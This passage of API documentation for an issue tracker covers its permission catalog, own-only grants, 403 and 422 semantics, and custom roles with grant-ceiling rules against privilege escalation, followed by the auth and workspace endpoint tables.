| `label.manage` | `WORKSPACE` | yes | Rename/recolor/describe (own-only is enough) and archive/unarchive/merge/delete (needs it unrestricted) |
| `project.edit` | `PROJECT` | — | Rename/describe the project; change its [delivery capabilities](#delivery-capabilities) |
| `project.archive` | `PROJECT` | — | Archive / unarchive the project |
| `project.member.manage` | `PROJECT` | — | Add/remove project members, change their project role, set the project's default role |
| `project.taxonomy.manage` | `PROJECT` | — | Project-private catalog & sets and this project's bindings |
| `issue.create` | `PROJECT` | — | File a new issue |
| `issue.edit` | `PROJECT` | yes | Any issue field not covered by a more specific key: title, description, type, priority, labels, component, versions, parent, due date, story points, custom fields. Own = issues you **reported** |
| `issue.transition` | `PROJECT` | — | Change an issue's status (board drag, status picker) |
| `issue.assign` | `PROJECT` | — | Set or clear an assignee, including self-assign |
| `issue.assignable` | `PROJECT` | — | **May be chosen as an assignee.** Checked against the *target*, not the caller — see [Assignability](#assignability--a-422-not-a-403) |
| `issue.rank` | `PROJECT` | — | Reorder the backlog/board rank |
| `issue.delete` | `PROJECT` | yes | Delete an issue. Own = issues you reported |
| `comment.create` | `PROJECT` | — | Post a comment |
| `comment.edit` | `PROJECT` | **required** | Edit a comment. **Own-only always** — not grantable unrestricted at any role, in any custom role. The bare key never appears anywhere |
| `comment.delete` | `PROJECT` | yes | Delete a comment. Own = your own; unrestricted = moderation |
| `attachment.create` | `PROJECT` | — | Upload a file to an issue |
| `attachment.delete` | `PROJECT` | yes | Delete an attachment. Own = files you uploaded |
| `sprint.manage` | `PROJECT` | — | Create / rename / start / complete / delete [sprints](#sprints--backlog) |
| `sprint.assign` | `PROJECT` | — | Put issues into / take issues out of a sprint — including `PATCH …/issues/{number}` with a `sprintId` |
| `version.manage` | `PROJECT` | — | Create / edit / release / unrelease / archive / delete [versions](#versions). Setting `fixVersionIds` on an issue is `issue.edit`, not this |
| `component.manage` | `PROJECT` | — | Create / edit / archive / delete [components](#components). Setting `componentId` on an issue is `issue.edit` |

**There is no `permissions` table in the database.** The catalog is code; what is stored are *grants* — rows tying a permission key to a role. Adding a permission is a code change plus a seed row, never a migration, which is why the endpoint and not this page is the source of truth.

**`capability` is a hint, not a gate.** A project whose [`delivery.board`](#delivery-capabilities) is `KANBAN` still enforces `sprint.manage` in exactly the same way, and `delivery.releases: false` changes nothing about `version.manage`. Capabilities decide what the UI offers; permissions decide what the API allows. Never substitute one for the other.

### `myPermissions` — what *you* may do

Every [workspace](#workspaces) and [project](#projects) response carries `myPermissions`: the **requesting user's** effective permissions on that object, as a flat array of catalog keys. It rides responses a client already fetches, so asking "may I do this?" costs no extra request.

- **Always present**, in catalog order. An empty array is a real answer (a caller with no grants); the field is never `null` and never omitted — never read "absent" as "allowed".
- **The caller only.** It never describes another user's access.
- **Scoped to the object it rides.** A workspace's array holds only `WORKSPACE`-scoped keys; a project's holds only `PROJECT`-scoped keys — including any the caller gets in that project by virtue of their workspace role rather than a project membership.

### The `:own` suffix

An entry is one of two forms:

| Wire value | Means |
|---|---|
| `issue.edit` | the permission over **any** object of that kind |
| `issue.edit:own` | the permission over **only objects the caller owns** |

"Own" is per permission: the issue's **reporter** for `issue.edit` / `issue.delete`, the comment's **author** for `comment.edit` / `comment.delete`, the **uploader** for `attachment.delete`, the **creator** for `label.manage`. At most one of the two forms appears for a given permission — an unrestricted grant supersedes an own-only one.

**`issue.edit` and `issue.edit:own` are two distinct values, not a prefix relationship.** An own-only grant does **not** satisfy an unrestricted check. Compare with equality:

```js
// the unrestricted question: "may I edit anyone's issue?"
const canEditAny = perms.includes('issue.edit');

// the per-object question: "may I edit this one?"
const canEdit = (issue) =>
  perms.includes('issue.edit') ||
  (issue.reporter.id === me.id && perms.includes('issue.edit:own'));

// WRONG — a prefix match also matches 'issue.edit:own', silently reading an
// own-only grant as permission over everyone's issues.
const canEditAnyBroken = perms.some((p) => p.startsWith('issue.edit'));
```

That failure widens rather than narrows, which is why it is worth stating plainly. Keys never contain a `:`, so the suffix is unambiguous if you do need to split — but equality against the two full strings is the safer test.

### What a `403` says

Every permission-gated operation — project settings and membership, [components](#components), [versions](#versions), [sprints](#sprints--backlog), [issues](#issues), [comments](#comments) and [attachments](#attachments), and now the workspace-scoped ones too ([member administration](#managing-members), [labels](#labels), [delegated admin](#delegated-administration), project creation) — resolves to a permission check, and the failure **names the permission that was missing**:

```json
{ "type": "about:blank", "title": "Forbidden", "status": 403,
  "detail": "Requires permission: sprint.manage" }
```

- **`detail` is `Requires permission: <key>`**, where `<key>` is a catalog key exactly as [`GET /permissions`](#the-catalog--get-permissions) reports it. A client can look up what the caller was missing instead of inferring it from the endpoint, which is precisely how you diagnose a control that was rendered but should not have been.
- **The key is always the bare form, never `:own`.** A `403` on an object you do not own reads `Requires permission: issue.edit` even where an `issue.edit:own` grant would have carried a different object.
- **`403` still means "a member who is not allowed".** A missing workspace, a missing project or a non-member is a `404`, exactly as before — a permission failure never reveals, and never hides, existence.
- Treat the sentence as human-readable text and the **key inside it** as the machine-readable part: keys are the permanent wire contract, the wording around them is not.

The `"Insufficient workspace permissions"` / `"Insufficient project permissions"` sentences are **gone**, and so is the detail-less `403` a [comment](#comments) edit or delete used to return: every one of those now names a key like the example above. If you were matching on that old wording, match on the key instead.

Two refusals deliberately do **not** name a permission, because a permission is not what refused:

- **The grant ceiling** — `"You cannot assign or administer the role \"X\", which includes <key> — a permission you do not hold in this workspace"`. The caller holds the permission for the endpoint; what they may not do is hand out (or act on someone holding) more than they have themselves. It names the offending permission *inside* the sentence so an admin can act on it, but it is not a `Requires permission:` message.
- **The Owner guardrail** — `"Only an Owner can assign the Owner role or administer another Owner"`. Owner and `ADMIN` hold identical permissions on purpose, so no permission comparison can express this; it is a rule about assignment.

Both are `403`. They are described under [Managing members](#managing-members), and they also reach the [role endpoints](#custom-roles): composing a role you could not hand out, and reassigning a role's holders onto a wider one, are refused the same way.

**Permission first, project state second.** The permissions a request's own shape determines are checked **before** the project's state, so a caller who lacks the permission on an **archived** project gets the `403`, not the `409 "Project is archived"`. This is a deliberate behavior change — [deleting an issue](#issues), [deleting an attachment](#attachments), [commenting](#comments) and [ranking](#ranking-an-issue) used to report the archive conflict first — and the rule is: the answer to "may you?" must never depend on the state of the thing you are asking about. It holds for *every* permission a request needs, not just the first: `POST …/issues/{number}/rank` can require both `issue.rank` and `sprint.assign`, and the archived-project `409` now waits for both, so a caller missing `sprint.assign` sees the `403` on an archived project exactly as they would on a live one.

**One request, several permissions.** A request that changes several things needs a permission for each of them; `PATCH …/issues/{number}` is the main case (see [Issues](#issues)). Only fields that are **present and actually changing** are checked, so a whole-form `PATCH` that moves one field does not need rights over everything else it echoes back. When several are missing, the `403` names the **first** in catalog order — fixing that grant can surface the next one, so re-try after a grant change rather than reading the first message as the complete list.

### Assignability — a `422`, not a `403`

`issue.assign` and `issue.assignable` are checked against **different people**, and integrators should not read them as a pair:

| Permission | Held by | Question |
|---|---|---|
| `issue.assign` | the **caller** | may *you* set or clear an assignee at all |
| `issue.assignable` | the **target user** | may *that person* be given work in this project |

Failing the first is a `403` naming `issue.assign`. Failing the second is **not** a permission failure of the caller's — they were entitled to make the request, the *value* they sent is invalid — so it answers `422`:

```json
{ "type": "about:blank", "title": "Unprocessable Content", "status": 422,
  "detail": "That user cannot be assigned in this project" }
```

That sentence is deliberately different from `"Unknown assignee"`, the `422` for a user id that belongs to nobody in the workspace: a member is never told a colleague does not exist. Both mean "pick someone else"; only distinguish them if you surface distinct copy.

Assignability is validated **only on a new assignment**. Nothing is unassigned when a user loses `issue.assignable` — existing assignees keep rendering everywhere, and re-saving an issue whose assignee is unchanged never `422`s. A [component](#components) auto-assign lead who lacks the permission is skipped silently and the issue is filed unassigned, rather than failing a create over somebody else's role.

### `myPermissions` is not an authorization boundary

It is **advisory, for rendering only — the API is the enforcement boundary.** It does not decide anything: the API performs its own check on every request, whatever the client drew. A call the caller may not make fails identically whether the button was hidden or not, and hiding a control is a UX decision, never a security control. The corollary is worth stating for integrators: **a client that gates nothing is still safe** — ignoring `myPermissions` entirely costs you a friendlier UI and a few avoidable `403`s, never an escalation. Use it to avoid dead ends, not to enforce them. Equally, `myRole` is display metadata — on a project it reports the caller's **explicit** project role (`VIEWER` when they have no project membership row of their own, even where that member can in fact do more), so it can be narrower than the truth. It is also a [role key string, not a closed enum](#role-values-are-keys-not-an-enum), so `myRole === 'MANAGER'` is not a question that can be answered correctly for every member. Gate on `myPermissions`.

## Custom roles

A workspace can define **its own roles** on top of the eight built-in ones, each a named bundle of [permissions](#permissions) and nothing more. There is no ordering on roles and no rung a custom role occupies; what a role can do is exactly the set of keys it holds.

| Method | Path | Auth | Description |
|---|---|---|---|
| `GET` | `/workspaces/{wsId}/roles?scope=&includeUsage=` | member | Built-in templates plus this workspace's own. `includeUsage=true` additionally requires `workspace.role.manage` |
| `GET` | `/workspaces/{wsId}/roles/{roleId}` | member | Get one role |
| `POST` | `/workspaces/{wsId}/roles/{sourceRoleId}/duplicate` | `workspace.role.manage` | **The only way to create a role.** `201` |
| `PATCH` | `/workspaces/{wsId}/roles/{roleId}` | `workspace.role.manage` | Rename, re-describe or re-compose a custom role |
| `DELETE` | `/workspaces/{wsId}/roles/{roleId}?reassignToRoleId=` | `workspace.role.manage` | Delete, optionally moving every holder to another role. `204` |
| `GET` | `/workspaces/{wsId}/roles/{roleId}/usage` | `workspace.role.manage` | Where the role is currently in play |
| `POST` | `/workspaces/{wsId}/roles/preview` | `workspace.role.manage` | Dry-run the assignment feedback for a permission list. **Persists nothing** |

Every one of these resolves workspace membership **before** any permission is evaluated, so an unknown workspace and a caller who is not a member are one indistinguishable `404`, and a `403` is reachable only by a proven member — the same rule as everywhere else in the API.

**Two permissions, deliberately separate.** Listing and reading roles needs nothing but membership: role names are rendered for everybody on a People tab, and putting the list behind an administrative gate would only push clients to fetch it another way. Everything else needs **`workspace.role.manage`**, which is *not* `workspace.member.manage`: defining what a role may do is strictly more dangerous than handing out one that already exists, and a workspace can grant the second without the first. The one exception is `includeUsage=true`, the sensitive half of an otherwise open endpoint — it turns `GET …/roles` into a `403` for a member who lacks `workspace.role.manage`.

### Creating a role means duplicating one

There is **no `POST /roles`**, and that is deliberate rather than an oversight. You create a role by duplicating a built-in template (or another custom role) and editing the copy:

```bash
curl -X POST "$BASE/workspaces/$WS/roles/$CONTRIBUTOR_ID/duplicate" \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"name":"Team lead (QA)"}'
```

The reason is the [grant ceiling](#the-grant-ceiling): it is a **subset** rule, not a ladder. A role assembled from an empty checklist — say, `project.member.manage` and nothing else — can assign *nobody*: not the contributor role, not Commenter, not even Viewer-plus-anything, because it is a superset of none of them. Discovering that as a `403` six weeks after building the role is the exact failure this model exists to prevent, so the API has no door that starts from nothing. Duplication always starts from a superset. "From scratch" is still reachable — duplicate **Viewer**, which grants nothing — but it is then a named, deliberate act instead of the default.

What is copied and what is not:

- `scope` and the entire permission set come **from the source** and are not on the request.
- `name` defaults to `"<source name> copy"`. It must be unique within (workspace, scope) and must not equal a built-in's display name in that scope, case-insensitively — `409` otherwise. Names are guarded, not keys, because names are the level users actually read.
- `key` is **generated server-side** from the name (uppercased, `[A-Z0-9_]`, truncated to 40 characters, suffixed `_2`, `_3`… on collision) and is never accepted from a client. That generation is also what stops a custom role from reusing a built-in's key.
- The source is addressed by **path**, so an unknown or foreign `sourceRoleId` is a `404`.
- There is a per-workspace cap on custom roles (both scopes counted together, built-ins excluded); a workspace at its cap gets a `409` `errorType: "ROLE_LIMIT_REACHED"` before any other work is done. **The cap is exact, not advisory** — the count is taken under a row lock on the workspace, so concurrent duplicates cannot overshoot it. That lock is also why this is the one role endpoint that can lose a lock race and answer a *retryable* `409` with `Retry-After`; nothing is created when it does.

### The grant ceiling

**Everything you hand out, you hold.** Nobody may assign — or act on a member holding — a role that grants a permission they do not hold themselves. It compares *permission sets*, never role names, and it compares them **per grant width**: an unrestricted grant is not covered by an own-only one, so a holder of `label.manage:own` can never hand out unrestricted `label.manage`.

The refusal is a `403` that **names the offending permission**:

```json
{ "type": "about:blank", "title": "Forbidden", "status": 403,
  "detail": "You cannot assign or administer the role \"QA lead\", which includes issue.rank — a permission you do not hold in this workspace" }
```

The same rule bounds *defining* a role, not only assigning one: a `PATCH` or a duplicate that would produce a workspace-scoped role granting something the caller lacks is refused the same way, naming the same key. It also bounds a [delete-with-reassign](#deleting-a-role-and-reassigning-its-holders), which is neither — it is a grant to every holder at once.

**The workspace Owner is above the ceiling in their own workspace**, for both defining and assigning. They are the root of trust: the ceiling exists to stop escalation *past* whoever is ultimately responsible, and inside one workspace that is the Owner. It is also the only reason `project.administer.all` is reachable at all — no built-in role holds it, so without the exemption it would be a permission the product ships and nobody can ever mint. **An `ADMIN` is not exempt**, which is the whole point of the distinction.

The definition ceiling applies to **`WORKSPACE`-scoped roles only**. A project-scoped role has no comparand — an actor's project permissions differ from project to project — and inventing one at workspace level would forbid an admin from duplicating the contributor role, which is the product's primary recipe. Its entire practical effect is therefore *"only an Owner may mint `project.administer.all`"*, which is a small and exactly-right rule.

**Both ends of a role write are bounded — the role as it stands today, not only the set you are sending.** This is the rule `PATCH …/members/{userId}` has always applied to a membership, where the ceiling is measured against the old role *and* the new one, because checking only the new one would let an `ADMIN` demote an `OWNER`. The role editor now applies the same rule: bounding only the incoming set would let an administrator **strip** a role that grants more than they hold — sabotage rather than escalation, and irreversible by the person who did it, since putting those grants back is exactly what this ceiling refuses.

The consequence you will meet: a workspace `ADMIN` cannot strip, delete, **or even rename** a `WORKSPACE`-scoped role that grants something they do not hold themselves. An `OWNER` may do all three. An `ADMIN` still edits and deletes freely within their own set. The refusal is the same `403`, naming the same offending permission.

Rename is included on purpose — a role's **name is what an administrator picks it by**, so relabelling "Deputy" as "Intern" leaves the next admin handing out something they believe they understand. Whatever you may not strip, you may not relabel. For that reason the current-role check runs on **every** `PATCH`, not only one carrying `permissions`, and its `403` is evaluated **before** the name-conflict `409`: a caller over the ceiling is told so first, even when the new name happens to be taken as well.

`PROJECT`-scoped roles keep the drop described just above, at **both** ends — neither the role as it stands nor the incoming set is measured there. The asymmetry is deliberate rather than an oversight (there is no comparand at project scope), and the `SELF_HELD_ROLE` rules on [editing](#editing-a-role) and [deleting](#deleting-a-role-and-reassigning-its-holders) are what guard those instead.

### Scope is immutable, and permissions must match it

A role's `scope` is fixed at creation and is **not on the update request**. Were it editable, one `PATCH` would turn every existing assignment of that role into a wrong-scope row — a `WORKSPACE` role sitting in a project membership, putting `workspace.member.manage` into every holder's *project* permissions. A permission set carries no memory of where a grant came from, so nothing downstream could notice.

The same reasoning gives the other half of the rule: **a permission's scope must equal the role's scope**. A `PROJECT` role carrying `workspace.edit` is a `422`, as is a `WORKSPACE` role carrying `issue.transition`.

Three more `422`s on the same request, all about a *value* rather than the shape of the body:

| Refusal | `detail` |
|---|---|
| Unknown permission key | `Unknown permission: <key>` |
| Permission of the wrong scope | `Permission <key> cannot be granted by a PROJECT-scoped role — a role may only hold permissions of its own scope` |
| `ownOnly: true` on a permission whose `supportsOwn` is `false` | `Permission <key> cannot be narrowed to objects you own` |
| The same key listed twice | `Permission <key> is listed twice` |

Note the asymmetry with `ownRequired`: `comment.edit` is **forced** own-only rather than refused — send it either way and it stores as own-only.

### Built-in roles are read-only

The eight built-in roles are product metadata shared by every workspace, not tenant data. They are visible everywhere, assignable everywhere, and **neither editable nor deletable**: a `PATCH` or `DELETE` on one is a `409` — *"Built-in roles cannot be edited or deleted — duplicate it to customise"*. It is a `409` rather than a `403` because the caller's permissions are fine; what refuses is the nature of the resource.

Branch on the `builtIn` flag, never on the key: a workspace may legally own a custom role keyed `ADMIN` beside the built-in one, and **that** role is editable.

### Editing a role

```json
// PATCH /workspaces/{wsId}/roles/{roleId}
{
  "name": "QA lead",
  "permissions": [
    { "key": "issue.transition" },
    { "key": "comment.edit", "ownOnly": true }
  ],
  "version": 3
}
```

- Every field is optional; omit one to leave it alone.
- **`permissions` is a full replacement**, not a delta. An empty array is a real value — a role that grants nothing is legal, and the built-in Viewer is exactly that.
- `ownOnly` defaults to `false`; an unqualified grant is the unrestricted one.
- `version` is the optimistic-concurrency token from the role you loaded. Present and stale is a `409` *"Role was modified by someone else — refresh and retry"*; absent is last-writer-wins. **Send it.** A permission set is exactly the state where a silent lost update is unacceptable: two admins each unticking one box would otherwise restore each other's, and the loser's revocation would look like it had been applied.

**You may not strip — or rename — a `WORKSPACE`-scoped role that grants more than you hold** (`403`). The [grant ceiling](#the-grant-ceiling) is measured against the role *as it stands today* as well as against the set you are sending, so an `ADMIN` editing a role that includes a permission they lack is refused whatever the body contains — including a body that changes nothing but `name` or `description`, because the name is what the next administrator picks the role by. An `OWNER` is exempt inside their own workspace, and this `403` is evaluated before the name-conflict `409`. `PROJECT`-scoped roles are not measured this way; the rule below is what guards them.

**You may not widen a `PROJECT`-scoped role you hold yourself** — `409` `errorType: "SELF_HELD_ROLE"`. An edit is a grant to every holder of the role at once, evaluated against nobody, and the definition ceiling deliberately does not apply at project scope. Without this rule a member of a project carrying a custom role could `PATCH` twenty permissions into it and hand themselves `issue.delete`, `project.archive` and `project.taxonomy.manage` there — the "remove your own row, add it back bigger" route, reassembled out of one call. Narrowing, renaming and re-describing a role you hold all stay legal, and so does widening one you *do not* hold, which is the ordinary recipe. The remedy is the same as for the delete: move yourself to another role first, or ask another administrator to make the change.

### Deleting a role, and reassigning its holders

`DELETE …/roles/{roleId}` refuses with `409` `errorType: "ROLE_IN_USE"` when the role still has holders and no `reassignToRoleId` was given. The refusal carries the **whole usage object**, so a client renders the remap dialog straight from it rather than issuing a second request:

```json
{
  "type": "about:blank", "title": "Conflict", "status": 409,
  "detail": "This role is still assigned — pass reassignToRoleId to move its holders to another role, or change them individually first",
  "errorType": "ROLE_IN_USE",
  "usage": {
    "roleId": "…", "members": 4, "invites": 1,
    "projectMembers": 7, "projects": 2,
    "defaultForProjects": 1, "defaultForWorkspace": false, "inUse": true
  }
}
```

Repeat with `?reassignToRoleId=…` and every holder is moved in the same transaction before the role is deleted. What gets moved depends on the scope: workspace memberships and pending invites for a `WORKSPACE` role; project memberships and the two default-project-role columns for a `PROJECT` one. The target must be assignable in this workspace **and of the same scope**; anything else — unknown, foreign, wrong scope, or the role being deleted — is one indistinguishable `422`.

**A `PROJECT`-scope reassign moves more than the role's holders.** Alongside the project memberships it repoints every project — and the workspace itself — that named the deleted role as its [default project role](#the-default-project-role) onto the replacement. That is a change in what **non-members** get, which is broader than "its holders were moved" suggests: a project whose default was that role now hands the replacement to every workspace member who has no explicit row there. It is also why `defaultForProjects` and `defaultForWorkspace` count towards `inUse` — read them in the `409` to see how many defaults are about to move and show them beside the headcounts. And it is the **only** write path that changes a default project role in this release, since the project endpoints accept none.

**The role being deleted is measured against your own permissions too** (`403`), and it is the first thing checked — before the self-held, in-use and stranding refusals. Deleting a role is the strongest possible edit of it, so an `ADMIN` may not delete a `WORKSPACE`-scoped role granting a permission they do not hold: otherwise `DELETE …?reassignToRoleId=…` would be the very demotion `PATCH …/members/{userId}` refuses, taken through a door that endpoint closes. An `OWNER` is exempt, the refusal names the offending permission, and at `PROJECT` scope this end is dropped exactly as it is on `PATCH` — the narrow-or-preserve rule below carries that scope instead.

**You cannot delete a role you hold yourself** (`409` `errorType: "SELF_HELD_ROLE"`). Delete the custom "QA" role you hold in project P, reassigning to the built-in project `MANAGER`, and you would be that project's administrator — a widening no ceiling can see, because a ceiling is evaluated per assignment and this is one bulk update over every holder at once. The refusal is deliberately blunt, and its remedy is one call you can make yourself: move yourself to another role first, or ask another administrator to run the delete.

**A reassign may narrow or preserve, never widen** (`403`). A bulk reassign is not an assignment, so the per-assignment [grant ceiling](#the-grant-ceiling) cannot see it — and without a rule of its own, one call would move every holder of a narrow role onto the built-in project `MANAGER`, in projects the caller is not even a member of. So:

- at **`WORKSPACE`** scope the target is measured against the caller's own permissions — the identical ceiling a member role change applies, which means the Owner guardrail comes with it;
- at **`PROJECT`** scope there is no such comparand (an actor's project permissions differ per project, and they may hold none anywhere), so the target is measured against **the role being deleted**: it must be covered by it, so every holder ends up with the same grants or fewer. A reassign then cannot manufacture authority that did not already exist on those very rows.

The workspace Owner is exempt in their own workspace, as everywhere else, and the refusal names the offending permission: *Reassigning "QA lead" to "Project admin" would widen every holder's access: the replacement includes `issue.delete`, which "QA lead" does not grant.*

**A reassign can never mint an Owner *invitation*** (`403`). `POST …/invites` has always refused to hand the built-in `OWNER` role to an invitation — not even one issued by an owner: ownership is handed over to an existing member, it is not offered to somebody who has not joined yet. Reassigning a `WORKSPACE`-scoped role that still has **pending invites** to the built-in `OWNER` would repoint those invites at it through the back door, so that is refused too, and the `detail` says how many are in the way:

> This role has 2 pending invitations, and an invitation can never grant the Owner role — ownership is handed over to an existing member, not offered to somebody who has not joined yet. Reassign to another role, then promote them once they accept

The invites are refused rather than quietly destroyed: they belong to somebody else, and you did not ask for them to be deleted. There are exactly two ways out, both named in the message — **reassign to any other role**, or let the invitees accept and then promote them with `PATCH …/members/{userId}`, which is the door ownership is meant to travel. This one applies to an owner as well, since the Owner exemption returns from the reassign ceiling before the Owner guardrail inside it can be reached, and that gap is what it closes.

**`GET …/roles/{roleId}/usage`** returns the same object outside a refusal. `inUse` is the exact disjunction the delete guard uses (`members`, `invites`, `projectMembers`, `defaultForProjects`, `defaultForWorkspace` — **not** `projects`, which only counts how many distinct projects the project memberships are spread across), published so a client cannot compute a different answer from the parts and then be surprised by a `409`. Every count is filtered to this workspace: built-in roles are shared rows belonging to no workspace, so an unscoped count would publish another tenant's headcount.

**`null` and a zeroed object are different answers, and the difference matters.** On the list, `usage` is `null` when you did not ask for it (`includeUsage` absent or `false`) — that says nothing at all about whether the role is in use. When you *did* ask, every role carries a full object, including one that is in play nowhere: all counts `0` and `inUse: false`, byte-identical to what `GET …/roles/{roleId}/usage` answers for it. So a client that asked never has to tell "unused" from "unknown", and a client that did not ask must never read `null` as "unused".

### The `409` codes on role writes

Role writes are the one place with several conflicts that share a status, so **branch on the response, never on the wording of `detail`, and in this order**:

1. **`Retry-After` present** → [lock contention](#errors). Retry the *identical* request after that many seconds. It carries **no `errorType`**, which is exactly why the header has to be checked first: an absent discriminator otherwise reads as "no recovery I know about", the one wrong answer for a body that is only asking to be retried.
2. **`errorType: "ROLE_IN_USE"`** → the role still has holders. Offer the remap dialog; the body already contains `usage`.
3. **`errorType: "SELF_HELD_ROLE"`** → one rule, two doors: *you may not widen your own access in bulk.* Either you hold the role being deleted, or the `PATCH` widens a `PROJECT`-scoped role you hold. Offer "change my own role first"; there is no flag that clears this.
4. **`errorType: "LAST_PROJECT_ADMIN_BULK"`** → the change would demote every administrator of the listed projects at once — a `PATCH` removing `project.member.manage` from a `PROJECT`-scoped role, or a `DELETE` reassigning to a role that does not grant it. The body carries the same uncapped `projects` array as the [member-removal conflict](#managing-members). **There is no adoption retry here**, unlike a member removal: the remedy is the caller's own, and it is **not the same on both doors** — the edit door says *keep that permission on the role, or give each of those projects another administrator first*, while the delete door additionally requires the replacement to be **no wider than the role being deleted** (naming only the first constraint would walk the caller straight into [the reassign ceiling](#deleting-a-role-and-reassigning-its-holders)'s `403`). Render `detail` rather than composing the sentence yourself.
5. **`errorType: "ROLE_LIMIT_REACHED"`** → `POST …/duplicate` only: the workspace is at its custom-role cap. Offer "delete a role you no longer use"; do **not** retry. This is the discriminator that separates the cap from case 1 on the very same endpoint — they share a status, and only one of them is worth retrying.
6. **No `errorType` at all** → one of the plain conflicts: the role is built-in, the `version` is stale, or the name is taken. Read `detail` and show it.

Treat an `errorType` you do not recognise as case 6: render `detail`, offer no retry.

### The assignment block — what a role could hand out

Every role response carries a server-derived `assignment` block, and `POST …/roles/preview` returns the same block for a permission list that does not exist yet:

```json
"assignment": {
  "managesMembers": true,
  "canAssign":    [ { "roleId": "…", "name": "Viewer" } ],
  "cannotAssign": [ { "roleId": "…", "name": "Contributor", "missing": "issue.rank" } ],
  "warnings":     [ "MANAGES_MEMBERS_BUT_ASSIGNS_NOTHING" ]
}
```

It exists so the grant ceiling is visible **while a role is being composed** rather than as a `403` weeks later, and it is computed by the *same* server-side comparison the runtime ceiling makes — which is the only reason a preview and a refusal cannot disagree. `missing` is a permission **key**, never a rendered sentence, and it is the identical string the runtime `403` quotes.

Three things to hold onto:

- **It is advisory, for rendering only.** The API is the enforcement boundary and performs its own check on every request, exactly as with [`myPermissions`](#mypermissions-is-not-an-authorization-boundary). A client that ignores the block entirely is still safe; it just offers worse choices.
- **It is a lower bound.** It is computed from the role *alone* and ignores what a real holder additionally gets from their workspace role (`project.curate.all` / `project.administer.all`), so a holder may in practice assign more than `canAssign` lists. That is the conservative direction on purpose. Phrase it as *"on its own, this role can assign: …"*.
- **`warnings` are codes, not copy.** Today there is one: `MANAGES_MEMBERS_BUT_ASSIGNS_NOTHING`, raised when the role manages a roster and yet every role it can assign grants nothing — somebody who can add people to a project and cannot give any of them the ability to do a single thing. Note it is *not* literally "`canAssign` is empty": the built-in Viewer grants the empty set, the empty set is covered by every set, so every role can assign Viewer. It **warns, never blocks** — a role granting nothing is legal, and an intermediate save is legitimate. Treat an unrecognised code as informational.

`POST …/roles/preview` needs `workspace.role.manage`, persists nothing, and requires `scope` in the body (there is no stored role to take one from). It runs the **same validation a real write runs**, which is half its value: the same `422` for an unknown key, a wrong-scope permission, an illegal `ownOnly` or a duplicated key that `PATCH` would have produced — discovered while the checkboxes are being ticked instead of at Save.

```json
// POST /workspaces/{wsId}/roles/preview
{ "scope": "PROJECT", "permissions": [ { "key": "issue.transition" } ] }
// → 200 { "assignment": { … } }
```

### Role changes are not instant everywhere

**A role's *contents* are cached per server node for up to 10 seconds.** On a multi-instance deployment that means a **revocation** — unticking a permission on a role — can still be honoured on another node for that long, and the same delay applies to widenings. It is a known, accepted property, and the window is deliberately short and not configurable, because a configurable TTL on an authorization cache is a per-deployment way to lengthen a security window.

Two things are **not** subject to it:

- **Membership is never cached.** Changing which role a person holds — `PATCH …/members/{userId}`, `PATCH …/projects/{p}/members/{userId}`, and the whole of `DELETE …/roles/{roleId}?reassignToRoleId=` — takes effect on that person's very next request, on every node.
- **Permissions are never in the access token.** A demotion is not waiting for anyone's token to expire.

Within a single request, permissions are resolved once and reused, so a role change committed mid-request is not observed by that request. If you need certainty after an edit — an integration test, an admin script — wait out the window rather than racing it.

## Instance metadata

| Method | Path | Auth | Description |
|---|---|---|---|
| `GET` | `/meta` | — | Instance flags and version |

```json
{ "publicLandingEnabled": true, "termsAcceptanceRequired": true, "publicSignupEnabled": true, "version": "0.2.0" }
```

## Auth endpoints

| Method | Path | Auth | Description |
|---|---|---|---|
| `POST` | `/auth/register` | — | Create an account; sends a verification email. `201` |
| `POST` | `/auth/verify-email` | — | Exchange the emailed one-time token for a session |
| `POST` | `/auth/resend-verification` | — | Re-send the verification email (always `200`) |
| `POST` | `/auth/login` | — | Email + password → access token + refresh cookie |
| `POST` | `/auth/refresh` | cookie | Rotate the refresh token, get a fresh access token |
| `POST` | `/auth/logout` | cookie | Revoke the refresh token. `204` |
| `POST` | `/auth/forgot-password` | — | Send a reset link (always `200` — no account enumeration) |
| `POST` | `/auth/reset-password` | — | Set a new password with the emailed token; revokes all sessions |
| `GET` | `/auth/me` | ✔ | The current user (`id`, `email`, `displayName`, `avatarUrl`, `systemRole`, `needsOnboarding`) |

`GET /auth/me` includes **`needsOnboarding`** — `true` until the user creates or joins their first team (or skips the welcome screen). Route new sign-ins to the [onboarding](#onboarding) flow while it's true.

**Register** — `termsAccepted: true` is required on this instance:

```bash
curl -X POST $BASE/auth/register -H "Content-Type: application/json" -d '{
  "email": "you@example.com",
  "password": "correct-horse-battery",
  "displayName": "Ada Lovelace",
  "termsAccepted": true
}'
```

**Login / verify-email / refresh** all return the same shape:

```json
{
  "accessToken": "eyJhbGciOiJIUzUxMiJ9…",
  "expiresIn": 1800,
  "userId": "0197fa30-…",
  "email": "you@example.com",
  "displayName": "Ada Lovelace"
}
```

Unverified accounts cannot log in (`403` until the email is verified). A demo workspace and project are provisioned only when the user chooses "Create a team" during [onboarding](#onboarding) — not automatically on first authentication (users who join an existing team get none).

## Workspaces

The workspace is the top-level container (and tenancy boundary): members, projects, issue types, statuses and workflows all live inside one.

| Method | Path | Auth | Description |
|---|---|---|---|
| `POST` | `/workspaces` | ✔ | Create; caller becomes `OWNER`, default types/statuses are seeded. `201` |
| `GET` | `/workspaces` | ✔ | Workspaces the caller belongs to |
| `GET` | `/workspaces/{id}` | member | Get one |
| `PATCH` | `/workspaces/{id}` | `workspace.edit` | Rename the workspace, switch its [project-access mode](#project-access), or choose the default project role. Any subset of `{"name", "projectAccessMode", "defaultProjectRoleId", "clearDefaultProjectRole"}`; an empty body is a `400`. Returns the workspace |
| `GET` | `/workspaces/{id}/members` | member | List members |
| `PATCH` | `/workspaces/{id}/members/{userId}` | `workspace.member.manage` | Change a member's role (`{"roleId"}`, or the deprecated `{"role"}` — [exactly one](#naming-a-role-roleid-and-the-deprecated-role-key); subject to the grant ceiling on both the old and the new role). Returns the member |
| `DELETE` | `/workspaces/{id}/members/{userId}?adoptStrandedProjects=` | `workspace.member.manage` | Remove a member from the workspace — not their account. `204`; `409` when it would leave a project without an administrator, cleared by repeating the call with `adoptStrandedProjects=true` |
| `POST` | `/workspaces/{id}/invites` | `workspace.member.manage` | Email an invite (`{"email", "roleId"}`, or the deprecated `role` — [exactly one](#naming-a-role-roleid-and-the-deprecated-role-key); subject to the grant ceiling, never `OWNER`). `201` |
| `GET` | `/workspaces/{id}/roles` | member | The workspace's roles — see [Custom roles](#custom-roles) |
